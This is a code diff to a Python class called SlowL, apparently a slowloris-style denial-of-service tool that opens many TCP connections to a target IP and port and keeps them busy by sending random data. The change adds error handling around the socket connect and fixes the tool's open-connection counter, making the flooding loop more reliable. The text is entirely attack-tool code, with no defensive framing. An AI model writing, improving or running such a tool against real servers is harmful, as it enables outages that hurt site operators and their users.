@@ -19,15 +19,19 @@ class SlowL:
 
 	def handler(self):
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		sock.connect((self.ip, self.port))
+		try:
+			sock.connect((self.ip, self.port))
+		except:
+			self.open -= 1
+			return
 		while True:
 			try:
 				sock.send(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
 				sock.recv(1024)
 			except:
 				sock.close()
+				self.open -= 1
 				break
-		self.open -= 1
 
 if __name__ == '__main__':
 	ips = sys.argv[1]
